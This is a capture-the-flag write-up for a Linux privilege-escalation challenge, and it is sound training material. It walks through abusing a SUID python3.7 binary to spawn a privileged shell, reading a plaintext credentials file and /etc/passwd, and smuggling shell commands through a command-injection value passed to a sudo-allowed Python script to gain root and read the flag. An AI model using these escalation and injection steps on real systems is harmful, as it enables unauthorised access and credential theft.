# Space University of Interior Design

**Category**: Pwn

728 points

----

## Challenge Description

Storytelling is the root of interior design.

`nc X.X.X.X 55022` [IP redacted]

The flag is in the flag format: STC{...}

**Author:** zeyu2001

----

## Solution

![zeyu2001 on discord: "at least it's not cddc linux challenge"](https://user-images.githubusercontent.com/40383042/126910568-8fa4a994-65f4-42c1-9578-48de36160a02.png)

> Many thanks to my teammates [@Portatolova](https://github.com/Portatolova) and [@ThinkerPal](https://github.com/ThinkerPal) for helping solve this! Big brain time.

Let's connect to the provided server.

```sh
nc X.X.X.X 55022
```

This gives us a shell instance.

Looking around, we can find out that we are currently logged in as `guest`.

We can also see that we are in the `/home` folder. Jared is a tyrant, and owns both of the home folders of either of the users, `guest`, or `jared`, and we cannot access them.

```sh
whoami
guest
ls -la
total 16
drwxr-xr-x 1 jared jared 4096 Jul 17 03:52 .
drwxr-xr-x 1 root  root  4096 Jul 23 15:13 ..
drwx------ 1 jared jared 4096 Jul 17 03:52 guest
drwx------ 1 jared jared 4096 Jul 17 03:52 jared
```

We have to gain access to `jared` so that we can investigate the folders.

What next? Well, the initials of the challenge name are SUID...👀👀👀 From this, we can tell that we're probably looking for something we can exploit that has the SUID bit.

For the unacquainted, an executable with the SUID (**S**et owner **U**ser **ID** up on execution) bit set will run with the identity of the file owner, rather than the user running it. This can prove useful for privilege escalation exploits, which is what we're trying to accomplish here.

To find files with the SUID bit, we can run the following command:

```sh
find / -perm -4000 2>/dev/null
```

Let's break down this command to understand it better:

* The `find` command searches the entire filesystem (`/`) for files with at least the permissions corresponding to `4000`.
* The `4` in the leftmost bit of `4000`, means that SUID is set.
* The command also redirects the error output (`2`) to `/dev/null`, essentially ignoring any errors and resulting in a cleaner output.

```sh
find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/python3.7
/usr/bin/sudo
/bin/su
/bin/mount
/bin/ping
/bin/umount
```

Most of these are system files, which should have SUID set, but `python3.7` usually doesn't.

Let's take a closer look at its permissions and owner:

```sh
ls -l /usr/bin/python3.7
-rwsr-xr-x 1 jared root   4877888 Jan 22  2021 python3.7
```

Sure enough, it's owned by `jared`. This means that we should be able to somehow exploit this to gain access to `jared`.

Using the `-c` flag, we can pass the Python executable a string to run. This allows us to gain access to Jared's account by running this:

```sh
/usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Breaking it down again:

* `os.execl` executes a new program, replacing the current process, since we can only access the current process.

* By using it to run `/bin/sh` and passing in the arguments `sh` and `-p`, it will run `/bin/sh sh -p`.

  * This will start a shell instance that replaces the python process, allowing us to use it.

  * The `-p` option turns on privileged mode, which allows the shell instance to run with the effective user ID, `jared`, instead of our real user ID, `guest`.

After running the above command, we can check to see which user we are:

```sh
whoami
jared
```

Now that we are `jared`, we can investigate more. There's nothing interesting in the `guest` home folder, but there is something very interesting in Jared's:

```sh
cd jared
ls -la
total 892
drwx------ 1 jared jared   4096 Jul 17 03:52 .
drwxr-xr-x 1 jared jared   4096 Jul 17 03:52 ..
-rwx------ 1 jared jared    220 Apr 18  2019 .bash_logout
-rwx------ 1 jared jared   3526 Apr 18  2019 .bashrc
-rwx------ 1 jared jared    807 Apr 18  2019 .profile
-rwx------ 1 jared jared 884736 Jul 17 03:24 chinook.db
-rwx------ 1 jared jared    110 Jul 17 03:24 creds.txt
-rwx------ 1 jared jared    448 Jul 17 03:24 query_db.py
```

```text
cat creds.txt
In case I forget my credentials.

jared:iamrich

Thanks to my awesome sysadmin, no one else can see this file!
```

Thanks Jared! Your sysadmin isn't that awesome because we can see this file! :)

Alternatively, to get the password, we can access `/etc/passwd` and crack the password hash of `jared` using something like John the Ripper.

```sh
cat /etc/passwd  
root:x:0:0:root:/root:/bin/bash
✂️--- SNIP ---✂️
jared:8EBZS/mBif54s:1000:1000::/home/jared:/bin/sh
guest:x:1001:1001::/home/guest:/bin/sh
```

Either way, we now know that the password is `iamrich`. To log in another time, we can just do `su jared` and type in the password.

There are a couple of other interesting files in `/home/jared`. `chinook.db` is a sample SQL database, so let's take a look at `query_db.py`:

```sh
cat query_db.py
```

```python
#!/usr/bin/python3
import os
import tempfile
import argparse


def query_db(row):
    
    if not row:
        row = 'FirstName'

    sql = f".open /home/jared/chinook.db\nSELECT {row} FROM employees;"
    os.system(f'echo "{sql}" | /usr/bin/sqlite3')

    print("Done!")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("--row", help="Row to query")
    args = parser.parse_args()

    query_db(args.row)
```

Seems innocuous enough; it takes in the `--row` argument and queries it in the SQL database.

There is, however, an `os.system` call which we can perhaps exploit. However, `query_db.py` is owned by `jared`, and we already have access to this account. What we really want is access to `root`.

Using `sudo -l`, we can find out what we can run as root.

```text
sudo -l
Matching Defaults entries for jared on c3419090a912:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jared may run the following commands on c3419090a912:
    (ALL) NOPASSWD: /home/jared/query_db.py
```

That's it! We can run `query_db.py` as root. This means that we should find a way to exploit it to run our own commands.

As mentioned before, we can exploit these lines:

```py
    sql = f".open /home/jared/chinook.db\nSELECT {row} FROM employees;"
    os.system(f'echo "{sql}" | /usr/bin/sqlite3')
```

We can inject `"; COMMAND #` to run `COMMAND` as root.

This results in the final `os.system` call effectively being something like this:

```py
    os.system(f'echo ".open /home/jared/chinook.db\nSELECT"; COMMAND #" FROM employees;" | /usr/bin/sqlite3')
```

What this ends up doing is:

1. Echoing `".open /home/jared/chinook.db\nSELECT"`;
2. Executing `COMMAND` (the rest of the SQL query, after the `#`, is commented out);
3. Piping the results into `/usr/bin/sqlite3`.

However, injecting something doesn't give us any useful output. To see the output of `COMMAND`, we have to redirect the errors to standard output by adding `2>&1`.

Now, we can run things as `root`:

```sh
sudo /home/jared/query_db.py --row='"; whoami #' 2>&1 
.open /home/jared/chinook.db
SELECT 
root
Done!
```

Let's take a look at the home folder of `root`, `/root`.

```sh
sudo /home/jared/query_db.py --row='"; ls -la /root #' 2>&1 
.open /home/jared/chinook.db
SELECT 
total 20
drwx------ 1 root root 4096 Jul 17 03:51 .
drwxr-xr-x 1 root root 4096 Jul 23 15:13 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root   51 Jul 17 03:24 flag.txt
Done!
```

Sure enough, the flag file is there.

```sh
sudo /home/jared/query_db.py --row='"; cat /root/flag.txt #' 2>&1 
.open /home/jared/chinook.db
SELECT 
STC{sud0_4nd_su1d_ea4b1d43ddf99e0c8f3338c8e33d5808}Done!
```

### Flag

```text
STC{sud0_4nd_su1d_ea4b1d43ddf99e0c8f3338c8e33d5808}
```
